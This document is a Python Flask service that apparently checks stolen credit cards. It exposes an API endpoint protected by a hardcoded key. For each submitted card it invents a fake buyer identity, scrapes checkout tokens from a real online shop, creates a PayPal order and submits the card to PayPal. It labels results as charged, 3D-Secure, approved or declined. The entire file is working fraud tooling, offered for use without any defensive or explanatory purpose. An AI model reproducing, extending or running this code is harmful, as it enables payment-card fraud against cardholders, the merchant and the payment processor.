import os
import requests
import re
import random
import string
from flask import Flask, request, jsonify
from requests_toolbelt.multipart.encoder import MultipartEncoder
import user_agent

app = Flask(__name__)

# --- Helper functions ---
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
    states = ["NY", "CA", "IL", "TX", "AZ"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001"]
    idx = random.randint(0, len(cities) - 1)
    return cities[idx], states[idx], f"{random.randint(1,999)} {random.choice(streets)}", zip_codes[idx]

def generate_random_account():
    return f"{''.join(random.choices(string.ascii_lowercase, k=10))}{random.randint(1000,9999)}@gmail.com"

def generate_phone_number():
    return f"303{''.join(random.choices(string.digits, k=7))}"

# --- Main checking logic ---
def check_card(card_details):
    try:
        n, mm, yy, cvc = card_details.strip().split('|')
        if len(mm) == 1:
            mm = f'0{mm}'
        if "20" in yy:
            yy = yy.split("20")[1]

        user = user_agent.generate_user_agent()
        r = requests.session()

        # Fake user info
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        acc = generate_random_account()
        num = generate_phone_number()

        # 1. Add to cart
        multipart_data = MultipartEncoder(fields={'quantity': '1', 'add-to-cart': '4451'})
        headers_cart = {'user-agent': user, 'content-type': multipart_data.content_type}
        r.post('https://switchupcb.com/shop/i-buy/', headers=headers_cart, data=multipart_data)

        # 2. Checkout tokens
        response_checkout = r.get('https://switchupcb.com/checkout/', headers={'user-agent': user})
        try:
            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response_checkout.text).group(1)
            create = re.search(r'create_order.*?nonce":"(.*?)"', response_checkout.text).group(1)
        except:
            return {"card": card_details, "status": "Error", "message": "Token scrape failed"}

        # 3. Create PayPal order
        json_data_create = {
            'nonce': create,
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street_address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce={check}&ppcp-funding-source=card',
        }
        order_data = r.post('https://switchupcb.com/?wc-ajax=ppc-create-order', json=json_data_create).json()
        if 'data' not in order_data or 'id' not in order_data['data']:
            return {"card": card_details, "status": "Error", "message": "Failed PayPal order"}

        paypal_id = order_data['data']['id']

        # 4. PayPal GraphQL final request
        json_data_graphql = {
            'query': 'mutation payWithCard($token: String!, $card: CardInput!) { approveGuestPaymentWithCreditCard(token: $token, card: $card) { flags { is3DSecureRequired } } }',
            'variables': {'token': paypal_id, 'card': {'cardNumber': n, 'expirationDate': f'{mm}/20{yy}', 'securityCode': cvc}}
        }
        last = requests.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers={'user-agent': user}, json=json_data_graphql).text

        # Status handling
        if 'ADD_SHIPPING_ERROR' in last or '"status": "succeeded"' in last:
            return {"card": card_details, "status": "Approved", "message": "CHARGE ✅"}
        elif 'is3DSecureRequired' in last:
            return {"card": card_details, "status": "Approved", "message": "OTP 💥 [3D]"}
        elif 'INVALID_SECURITY_CODE' in last:
            return {"card": card_details, "status": "Approved", "message": "APPROVED CCN ✅"}
        else:
            return {"card": card_details, "status": "Declined", "message": "DECLINED ❌"}

    except Exception as e:
        return {"card": card_details, "status": "Error", "message": str(e)}

# --- API Endpoint ---
@app.route('/gateway=paypal1$', methods=['GET'])
def api_gateway():
    # Require API key
    key = request.args.get('key')
    if key != "rockyalways":
        return jsonify({"error": "Invalid or missing API key"}), 403

    # Require card info
    card_info = request.args.get('cc')
    if not card_info:
        return jsonify({"error": "Missing 'cc' parameter"}), 400
    if len(card_info.split('|')) != 4:
        return jsonify({"error": "Invalid 'cc' format, must be NUMBER|MM|YY|CVC"}), 400

    result = check_card(card_info)
    return jsonify(result)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
